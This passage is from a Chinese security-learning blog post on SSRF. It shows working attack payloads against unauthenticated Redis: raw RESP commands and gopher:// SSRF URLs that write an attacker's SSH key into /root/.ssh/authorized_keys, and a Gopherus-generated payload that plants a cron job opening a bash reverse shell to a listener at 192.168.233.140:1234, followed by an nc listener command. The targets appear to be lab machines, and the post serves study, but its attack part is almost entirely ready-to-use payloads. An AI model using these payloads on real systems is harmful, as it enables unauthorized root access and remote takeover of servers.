<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">CONFIG</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">SET</span><br><span class="hljs-variable">$3</span><br>dir<br><span class="hljs-variable">$11</span><br>/root/.ssh/<br><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$15</span><br>authorized_keys<br><span class="hljs-number">*3</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$7</span><br>payload<br><span class="hljs-variable">$568</span><br><br><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+2l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+0f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+16UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali<br><br><br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>save<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>quit<br></code></pre></td></tr></table></figure>

<p>替换换行符</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">*<span class="hljs-number">4</span>%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*<span class="hljs-number">4</span>%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*<span class="hljs-number">3</span>%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$568%0d%0a%0d%0a%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+<span class="hljs-number">2</span>l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+<span class="hljs-number">0</span>f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+<span class="hljs-number">16</span>UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali%0d%0a%0d%0a%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0asave%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0aquit<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSET%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adir%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">11</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a/root/.ssh/%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adbfilename%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">15</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aauthorized_keys%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">7</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>apayload%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">568</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+<span class="hljs-number">2</span>l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+<span class="hljs-number">0</span>f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+<span class="hljs-number">16</span>UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aquit<br></code></pre></td></tr></table></figure>

<p>在没有写入SSH公钥前使用私钥测试连接</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2222</span> root<span class="hljs-keyword">@192</span>.168.233.137<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424164425169.png" srcset="/img/loading.gif" lazyload alt="image-20250424164425169"></p>
<p>会发现需要公钥，连接不上</p>
<p>在提交payload后，再次连接，发现不需要公钥了，直接可以连接</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424164844401.png" srcset="/img/loading.gif" lazyload alt="image-20250424164844401"></p>
<h3 id="使用SSRF对Redis未授权计划任务Shell反弹"><a href="#使用SSRF对Redis未授权计划任务Shell反弹" class="headerlink" title="使用SSRF对Redis未授权计划任务Shell反弹"></a>使用SSRF对Redis未授权计划任务Shell反弹</h3><ul>
<li>权限问题，Ubuntu定时任务需要root权限</li>
<li>Redis备份文件存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
</ul>
<p>使用SSRF利用此漏洞切记在写入计划任务前后要加上<code>\n</code>来进行换行，否则数据污染会导致计划任务无法执行</p>
<p>要写入的目录是<code>/var/spool/cron/</code></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424171403427.png" srcset="/img/loading.gif" lazyload alt="image-20250424171403427"></p>
<p>使用工具，选择第一个</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 gopherus.py --exploit redis<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424165757734.png" srcset="/img/loading.gif" lazyload alt="image-20250424165757734"></p>
<p>填写目标的IP地址（根据实际填写）</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170000438.png" srcset="/img/loading.gif" lazyload alt="image-20250424170000438"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2470</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A/<span class="hljs-number">1</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>bash%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>sh%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>/dev/tcp/<span class="hljs-number">192.168.233.140</span>/<span class="hljs-number">1234</span>%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2416</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/var/spool/cron/%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aroot%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure>

<p>会反弹到1234端口，要进行监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 1234<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170153391.png" srcset="/img/loading.gif" lazyload alt="image-20250424170153391"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170514771.png" srcset="/img/loading.gif" lazyload alt="image-20250424170514771"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170556802.png" srcset="/img/loading.gif" lazyload alt="image-20250424170556802"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞笔记</a>
  
  
    <span>></span>
    
  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/SSRF/" class="category-chain-item">SSRF</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/SSRF-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="print-no-link">#SSRF 学习笔记</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SSRF学习</div>
      <div>https://yschen20.github.io/2025/05/09/SSRF学习/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>chen</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年5月9日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2025年5月9日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/" title="无参RCE解题">
                        <span class="hidden-mobile">无参RCE解题</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="twikoo"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
        var options = Object.assign(
          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
          {
            el: '#twikoo',
            path: 'window.location.pathname',
            onCommentLoaded: function() {
              Fluid.utils.listenDOMLoaded(function() {
                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
                Fluid.plugins.imageCaption(imgSelector);
                Fluid.plugins.fancyBox(imgSelector);
              });
            }
          }
        )
        twikoo.init(options)
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  var relativeDate = function() {
    var updatedTime = document.getElementById('updated-time');
    if (updatedTime) {
      var text = updatedTime.textContent;
      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
      var matchs = text.match(reg);
      if (matchs) {
        var relativeTime = moment(matchs[0]).fromNow();
        updatedTime.textContent = text.replace(reg, relativeTime);
      }
      updatedTime.style.display = '';
    }
  };
  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
    if (!'zh-cn'.startsWith('en')) {
      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
        relativeDate();
      });
    } else {
      relativeDate();
    }
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
